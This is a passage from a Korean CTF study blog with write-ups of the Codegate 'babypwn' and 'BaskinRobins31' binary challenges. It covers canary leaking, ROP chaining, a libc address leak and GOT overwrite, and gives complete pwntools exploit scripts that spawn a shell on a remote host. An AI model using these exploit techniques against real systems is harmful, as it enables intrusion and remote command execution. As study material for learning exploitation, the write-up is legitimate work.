sub_80488B1(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;===============================\n&quot;</span>);</span><br><span class="line">        v1 = sub_804895A();</span><br><span class="line">        <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        sub_80488B1(<span class="string">&quot;Input Your Message : &quot;</span>);</span><br><span class="line">        sub_8048907(&amp;v2, <span class="number">100</span>);</span><br><span class="line">        sub_80488B1(&amp;v2);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_80488B1(<span class="string">&quot;Input Your Message : &quot;</span>);</span><br><span class="line">      sub_8048907(&amp;v2, <span class="number">100</span>);</span><br><span class="line">      sub_80489C8(&amp;v2);</span><br><span class="line">      sub_80488B1(&amp;v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_80488B1(<span class="string">&quot;\n[!] Wrong Input\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>sub_8048A71 함수를 보면 v1, v2, v3 변수를 정의하는 것을 볼 수 있고, v3은 카나리입니다. 하지만 1번 메뉴와 2번 메뉴를 확인해보면 v2의 크기는 40인데 100만큼 입력 받기 때문에 BOF 취약점이 발생합니다. NX Bit가 걸려 있기 때문에 BOF 취약점을 이용해서 ROP를 해주면 될 거 같고, 카나리가 걸려 있기 때문에 카나리부터 릭을 해야합니다.</strong><br></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8181</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary Leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;a&quot;</span> * <span class="number">41</span>)</span><br><span class="line">canary = u32(<span class="string">&quot;\x00&quot;</span> + p.recv(<span class="number">1024</span>)[<span class="number">41</span>:<span class="number">44</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Canary : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br></pre></td></tr></table></figure>
<p><strong>Canary는 위와 같이 릭을 할 수 있습니다. v2의 값으로 <code>&quot;a&quot;</code>를 40개 주게 되면 v2 변수가 꽉차 v3 변수와 이어지게 됩니다. 하지만 v2를 꽉 채워주지 않으면 남은 메모리에 Null 값이 삽입되기 때문에 Canary를 릭할 수 없습니다. 하지만 40개를 다 채워줬는데 Canary가 출력 되지 않는데 이는 Canary에 시작도 Null로 시작하기 때문입니다. 그래서 <code>&quot;a&quot;</code>를 41개를 줘 Canary에 시작인 Null 값도 덮으면 Canary 전체를 릭할 수 있습니다.(Null 값이 존재하면 더 이상 읽지 않음)</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ objdump -h babypwn </span><br><span class="line"></span><br><span class="line">babypwn:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"> 24 .bss          0000000c  0804b1b4  0804b1b4  000021b4  2**2</span><br><span class="line">                  ALLOC</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure>
<p><strong>objdump를 이용해 bss를 구했습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ gdb -q .&#x2F;babypwn</span><br><span class="line">Reading symbols from .&#x2F;babypwn...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ p system</span><br><span class="line">$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x8048620 &lt;system@plt&gt;</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure>
<p><strong>그리고 해당 파일에 system 함수가 존재하기 때문에 libc를 따로 구하지 않아도 될 거 같습니다. 이제 Canary를 릭하고, system 함수가 존재하는 것을 알았기 때문에 ROP를 해보겠습니다.</strong><br></p>
<ul>
<li>시나리오<br></li>
</ul>
<ol>
<li>카나리를 릭한다 (Null 값 조심).</li>
<li>recv 함수를 이용해서 bss에 Command를 넣어준다. (bss에 값을 넣어줄 수 있는 함수가 recv 함수뿐이 없다)</li>
<li>system 함수의 인자로 bss를 넘겨준다. bss에는 <code>/bin/sh &lt;&amp;4 &gt;&amp;0</code>가 들어있다. <br></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;141.164.52.207&quot;</span>, <span class="number">8181</span>)</span><br><span class="line">E = ELF(<span class="string">&quot;./babypwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary Leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;a&quot;</span> * <span class="number">41</span>)</span><br><span class="line">canary = u32(<span class="string">&quot;\x00&quot;</span> + p.recv(<span class="number">1024</span>)[<span class="number">41</span>:<span class="number">44</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Canary : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line"></span><br><span class="line">ppppr = <span class="number">0x8048eec</span></span><br><span class="line">bss = E.bss()</span><br><span class="line">system_plt = E.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">recv_plt = E.plt[<span class="string">&#x27;recv&#x27;</span>]</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;/bin/sh &lt;&amp;4 &gt;&amp;0&quot;</span></span><br><span class="line">log.info(<span class="string">&quot;bss : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss)))</span><br><span class="line"></span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP Exploitation</span></span><br><span class="line">p = remote(<span class="string">&quot;141.164.52.207&quot;</span>, <span class="number">8181</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP Channing</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">40</span></span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * <span class="number">12</span> <span class="comment"># Dummy[8] + SFP[4]</span></span><br><span class="line"></span><br><span class="line">payload += p32(recv_plt)</span><br><span class="line">payload += p32(ppppr)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(command)+<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(system_plt)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit -&gt; RET </span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(command)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ python exploit.py </span><br><span class="line">[+] Opening connection to 141.164.52.207 on port 8181: Done</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;pocas&#x2F;pwn&#x2F;Codagate 2017&#x2F;babypwn&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Canary : 0x72c6c200</span><br><span class="line">[*] bss : 0x804b1b4</span><br><span class="line">[*] Closed connection to 141.164.52.207 port 8181</span><br><span class="line">[+] Opening connection to 141.164.52.207 on port 8181: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">FLAG&#123;GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG : FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}</p>
</blockquote>
<hr>
<h2 id="PWN-D-4-2021-01-28"><a href="#PWN-D-4-2021-01-28" class="headerlink" title="PWN D+4 (2021.01.28)"></a>PWN D+4 (2021.01.28)<br></h2><hr>
<p>Codagate 2018 Challenge : BaskinRobins31</p>
<p><strong>오늘은 64 Bit ROP 익스를 공부하고, 좀 쉬운 문제가 없나 보다가 코게 2018에서 나온 BaskinRobins31라는 문제가 있어 풀어보겠습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ checksec --file&#x3D;BaskinRobins31</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83) Symbols	  No	0		3		BaskinRobins31</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ </span><br></pre></td></tr></table></figure>
<p><strong>checksef을 이용해서 보호 기법을 확인해보니 RELRO와 NX Bit가 걸려있는 것을 볼 수 있습니다. NX Bit를 우회하기 위해 ROP를 이용해 익스를 진행하면 될 거 같고, Partial RELRO이기 때문에 GOT Overwrite가 가능합니다.</strong><br></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  _BOOL4 v6; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v5 = <span class="number">31</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;### This game is similar to the BaskinRobins31 game. ###&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;### The one that take the last match win ###&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;There are %u number(s)\n&quot;</span>, <span class="number">31LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      my_turn(&amp;v5);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">unsigned</span> __int64)your_turn(&amp;v5) != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;remaining number(s) : %i \n&quot;</span>, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wow! You win!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hint is : ROP&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You lose!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>코드를 보면 while 문 안에 v6의 값이 참이 아니면 else 문으로 들어가 your_turn 함수를 호출하는 것을 볼 수 있습니다.</strong><br></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">your_turn</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x96</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers do you want to take ? (1-3)&quot;</span>);</span><br><span class="line">  n = read(<span class="number">0</span>, &amp;s, <span class="number">0x190</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, &amp;s, n);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  v4 = strtoul(&amp;s, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_decision((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">char</span>)v4, <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 -= v4;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t break the rules...:( &quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>your_turn 함수를 보면 read 함수를 이용해서 s 값을 입력 받고, write 함수를 이용해서 출력해주는 것을 볼 수 있습니다. 하지만 s는 memset 함수를 이용해서 150 사이즈만큼 초기화 시켜주는데 read 함수에서는 400만큼 입력을 받고 있어 BOF 취약점이 발생합니다. RET까지 덮을려면 s[176] + sfp[8]만큼 덮어주면 됩니다. 이제 가젯들을 구해보겠습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ objdump -d BaskinRobins31 | grep -B4 &quot;ret&quot;</span><br><span class="line">(생략)</span><br><span class="line">--</span><br><span class="line">  400877:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  40087a:	5f                   	pop    %rdi</span><br><span class="line">  40087b:	5e                   	pop    %rsi</span><br><span class="line">  40087c:	5a                   	pop    %rdx</span><br><span class="line">  40087d:	c3                   	retq   </span><br><span class="line">  40087e:	90                   	nop</span><br><span class="line">  40087f:	5d                   	pop    %rbp</span><br><span class="line">  400880:	c3                   	retq   </span><br><span class="line">--</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure>
<p><strong>objdump를 이용해서 가젯을 찾아보니 pop pop pop ret 가젯을 있는 것을 확인할 수 있습니다. 그리고 system 함수에서 사용할 pop ret 가젯도 그냥 pppr 가젯에서 2를 더한 것을 사용하려 했는데 이를 이용하니 잘 되지 않았습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ ropsearch &quot;pop rdi&quot;</span><br><span class="line">Searching for ROP gadget: &#39;pop rdi&#39; in: binary ranges</span><br><span class="line">0x00400bc3 : (b&#39;5fc3&#39;)	pop rdi; ret</span><br><span class="line">0x0040087a : (b&#39;5f5e5ac3&#39;)	pop rdi; pop rsi; pop rdx; ret</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure>
<p><strong>그래서 ropsearch 명령어를 이용해서 pop rdi; ret 가젯을 찾아서 이를 이용했습니다.</strong><br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ objdump -h BaskinRobins31 </span><br><span class="line"></span><br><span class="line">BaskinRobins31:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">(생략)</span><br><span class="line"> 25 .bss          00000020  0000000000602090  0000000000602090  00002088  2**4</span><br><span class="line">                  ALLOC</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure>
<p><strong>마지막으로 objdump를 이용해서 bss를 구했습니다. 나머지 got/plt/offset은 pwntools를 이용해서 구할 수 있습니다.</strong><br></p>
<ul>
<li>시나리오<br></li>
</ul>
<ol>
<li>write 함수를 이용해서 read 주소를 릭하고, 이를 이용해서 libc_base를 구한다.</li>
<li>read 함수를 이용해서 bss에 쉘을 넣어준다.</li>
<li>read 함수를 이용해서 read got를 system 함수로 체이닝 해준다.</li>
<li>read 함수를 호출하고, 이때 인자로는 bss를 넘겨준다. bss에는 <code>/bin/sh</code>가 들어있다.<br></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./BaskinRobins31&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./BaskinRobins31&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">read_offset = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_plt = e.plt[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss = e.bss()</span><br><span class="line">pppr = <span class="number">0x40087a</span></span><br><span class="line">pr = <span class="number">0x00400bc3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;pppr : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pppr)))</span><br><span class="line">log.info(<span class="string">&#x27;bss : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss)))</span><br><span class="line">log.info(<span class="string">&#x27;read_plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;read_got : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.info(<span class="string">&#x27;write_plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;system_offset : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_offset)))</span><br><span class="line">log.info(<span class="string">&#x27;read_offset : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_offset)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># BOF</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">184</span> <span class="comment"># Buffer + SFP</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP Channing</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(1, read_got, 8);</span></span><br><span class="line">payload += p64(pppr)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pppr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pppr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;(1-3)\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - read_offset</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">log.info(<span class="string">&#x27;libc_base : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.info(<span class="string">&#x27;system : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system)))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.sendline(p64(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 이것 저것 확인한다고, 좀 지져분함.</span></span><br></pre></td></tr></table></figure>
